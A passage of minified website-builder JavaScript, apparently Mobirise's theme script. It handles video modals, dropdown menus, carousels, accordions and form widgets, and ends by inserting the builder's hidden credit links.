c.contentWindow.postMessage('{"event":"command","func":"playVideo","args":""}',"*"),-1!==d.indexOf("vimeo")){var e=new Vimeo.Player(c);e.play()}}else{var g=c.parentNode.querySelector("video");g&&g.play&&g.play()}var h=b.parents("section")[0],k=h.querySelector(h.querySelector("[data-modal]").getAttribute("data-modal"));k.style.display="table";k.addEventListener("click",function(b){"VIDEO"!==b.target.tagName&&(d?(-1!==d.indexOf("youtu")&&c.contentWindow.postMessage('{"event":"command","func":"pauseVideo","args":""}',
"*"),-1!==d.indexOf("vimeo")&&e.pause()):(b=c.parentNode.querySelector("video"))&&b.pause&&b.pause(),k.style.display="none",k.removeEventListener("click",a),h.style.zIndex="0")})};document.querySelectorAll(".modalWindow-video > iframe").forEach(function(a){var b=a.getAttribute("data-src")||a.getAttribute("src");if(b){a.removeAttribute("data-src");a.removeAttribute("src");var c=b.match(/(http:\/\/|https:\/\/|)?(player.|www.)?(vimeo\.com|youtu(be\.com|\.be|be\.googleapis\.com))\/(video\/|embed\/|watch\?v=|v\/)?([A-Za-z0-9._%-]*)(&\S+)?/);
if(-1!==b.indexOf("youtu"))a.setAttribute("src","https://youtube.com/embed/"+c[6]+"?rel=0&enablejsapi=1");else if(-1!==b.indexOf("vimeo"))a.setAttribute("src","https://player.vimeo.com/video/"+c[6]+"?autoplay=0&loop=0");else if(/\.mp4|\.webm|\.ogg|\.ogv|\.m4a|\.m4v/.test(b)){c=document.createElement("video");c.onloadeddata=function(a){a.target.style.height=a.target.videoHeight>a.target.videoWidth?window.innerHeight-.2*window.innerHeight+"px":"100%"};var d=a.parents("section")[0].querySelector("img");
d&&c.setAttribute("poster",d.src);c.setAttribute("controls","");c.setAttribute("playsinline","");c.setAttribute("loop","");c.setAttribute("src",b);a.style.display="none";c.style.width="100%";a.after(c)}}});document.querySelector("[data-modal]")&&document.querySelectorAll("[data-modal]").forEach(function(b){b.addEventListener("click",a)})}});if(!m){w=document.querySelectorAll(".dropdown-toggle.show");var A=document.querySelectorAll(".dropdown-menu.show, .dropdown.open"),I=document.querySelectorAll(".dropdown.open");
w.forEach(function(a){a.classList.remove("show");a.ariaExpanded="false"});A.forEach(function(a){return a.classList.remove("show")});I.forEach(function(a){return a.classList.remove("open")});!x()&&(w=document.querySelector("section.menu"))&&(A=window.innerWidth,!w.querySelector(".navbar").classList.contains("collapsed")&&991<A&&(w.querySelectorAll("ul.navbar-nav li.dropdown").forEach(function(a){a.addEventListener("mouseover",function(){a.classList.contains("open")||a.querySelector("a").dispatchEvent(new Event("click"))});
a.addEventListener("mouseout",function(){a.classList.contains("open")&&a.querySelector("a").dispatchEvent(new Event("click"))})}),w.querySelectorAll("ul.navbar-nav li.dropdown .dropdown-menu .dropdown").forEach(function(a){a.addEventListener("mouseover",function(){a.classList.contains("open")||(a.querySelector("a").dispatchEvent(new Event("click")),a.classList.add("open"))});a.addEventListener("mouseout",function(){a.classList.contains("open")&&(a.querySelector("a").dispatchEvent(new Event("click")),
a.classList.remove("open"))})})))}m||("undefined"===typeof window.initClientPlugin&&0!=document.body.querySelectorAll(".clients").length&&(window.initClientPlugin=!0,document.body.querySelectorAll(".clients").forEach(function(a){a.getAttribute("data-isinit")||(y(a),E(a))})),"undefined"===typeof window.initPopupBtnPlugin&&0!=document.body.querySelectorAll("section.popup-btn-cards").length&&(window.initPopupBtnPlugin=!0,document.querySelectorAll("section.popup-btn-cards .card-wrapper").forEach(function(a){a.classList.add("popup-btn")})),
"undefined"===typeof window.initTestimonialsPlugin&&0!=document.body.querySelectorAll(".testimonials-slider").length&&(window.initTestimonialsPlugin=!0,document.querySelectorAll(".testimonials-slider").forEach(function(a){y(a)})),"undefined"===typeof window.initSwitchArrowPlugin&&(window.initSwitchArrowPlugin=!0,k(function(){0!=document.querySelectorAll(".accordionStyles").length&&document.querySelectorAll('.accordionStyles > .card > .card-header > a[role="button"]').forEach(function(a){a.classList.contains("collapsed")||
a.classList.add("collapsed")})}),document.querySelectorAll('.accordionStyles > .card > .card-header > a[role="button"]').forEach(function(a){a.addEventListener("click",function(){var b=a.closest(".accordionStyles").getAttribute("id"),d=a.closest(".card").querySelector(".panel-collapse"),f=a.querySelector("span.sign")?a.querySelector("span.sign"):a.querySelector("span.mbr-iconfont");!d.classList.contains("collapsing")||-1==b.indexOf("toggle")&&-1==b.indexOf("accordion")||(a.classList.contains("collapsed")?
(f.classList.remove("mbri-arrow-up"),f.classList.add("mbri-arrow-down")):(f.classList.remove("mbri-arrow-down"),f.classList.add("mbri-arrow-up")),-1!=b.indexOf("accordion")&&(b=a.closest(".accordionStyles"),Array.from(b.children).filter(function(a){return a.querySelector("span.sign")!==f}).forEach(function(a){a=a.querySelector("span.sign")?a.querySelector("span.sign"):a.querySelector("span.mbr-iconfont");a.classList.remove("mbri-arrow-up");a.classList.add("mbri-arrow-down")})))})})),0!=document.querySelectorAll(".mbr-slider.carousel").length&&
document.querySelectorAll(".mbr-slider.carousel").forEach(function(a){var b=a.querySelectorAll(".carousel-control"),d=a.querySelectorAll(".carousel-indicators li"),f=function(a){a.stopPropagation();a.preventDefault()};a.addEventListener("slide.bs.carousel",function(){b.forEach(function(a){a.addEventListener("click",f)});d.forEach(function(a){a.addEventListener("click",f)});u&&g(a).carousel({keyboard:!1})});a.addEventListener("slid.bs.carousel",function(){b.forEach(function(a){a.removeEventListener("click",
f)});d.forEach(function(a){a.removeEventListener("click",f)});u&&g(a).carousel({keyboard:!0});1<a.querySelectorAll(".carousel-item.active").length&&(a.querySelectorAll(".carousel-item.active")[1].classList.remove("active"),a.querySelectorAll(".carousel-control li.active")[1].classList.remove("active"))})}));if(m){if(!u)return;g(document).on("add.cards",function(a){g(a.target).find(".form-with-styler").length&&(a=g(a.target).find(".form-with-styler"),g(a).find('select:not("[multiple]")').each(function(){g(this).styler&&
g(this).styler()}),g(a).find("input[type=number]").each(function(){g(this).styler&&(g(this).styler(),g(this).parent().parent().removeClass("form-control"))}),g(a).find("input[type=date]").each(function(){g(this).datetimepicker&&g(this).datetimepicker({format:"Y-m-d",timepicker:!1})}),g(a).find("input[type=time]").each(function(){g(this).datetimepicker&&g(this).datetimepicker({format:"H:i",datepicker:!1})}))})}document.querySelectorAll('input[type="range"]').forEach(function(a){a.addEventListener("change",
function(a){a.target.parents(".form-group").forEach(function(b){b.querySelector(".value").innerHTML=a.target.value})})});if(m)g(document).on("add.cards changeParameter.cards",function(a,b){"undefined"!==typeof CircularProgressBar&&new CircularProgressBar("pie_progress");b?G(a.target,b):a.target.querySelectorAll(".pie_progress").length&&a.target.querySelectorAll(".pie_progress").forEach(function(a){D(a)})});else document.querySelectorAll(".pie_progress").length&&("undefined"!==typeof CircularProgressBar&&
new CircularProgressBar("pie_progress"),document.querySelectorAll(".pie_progress").forEach(function(a){D(a)}));if(m&&u)g(document).on("add.cards",function(a){g(a.target).hasClass("testimonials-slider")&&y(a.target)}).on("changeParameter.cards",function(a,b,d){"testimonialsSlides"===b&&0==g(a.target).find(".carousel-item.active").length&&B(a.target)});else"undefined"===typeof window.initTestimonialsPlugin&&(window.initTestimonialsPlugin=!0,document.querySelectorAll(".testimonials-slider").forEach(function(a){y(a)}));
k(function(){m||Array.from(document.body.children).filter(function(a){return!a.matches("style, script")}).forEach(function(a){if(window.Event&&"function"===typeof window.Event)var b=new Event("add.cards");else b=document.createEvent("CustomEvent"),b.initEvent("add.cards",!0,!0);a.dispatchEvent(b)})})})();document.getElementsByTagName("body")[0].setAttribute("style","z-index: 0");!function(){try{document.getElementsById("top-1")[0].getElementsByTagName("a")[0].removeAttribute("rel")}catch(b){}if(!document.getElementById("top-1")){var a=document.createElement("section");a.id="top-1";a.style="display: none";a.innerHTML='<a href="https://mobirise.com/builder/web-design-program.html">web design program</a> Mobirise v5.7.8 <a href="https://mobirise.com/drag-drop-website-builder.html">best drag and drop website builder</a>';document.body.insertBefore(a,document.body.childNodes[0])}}();
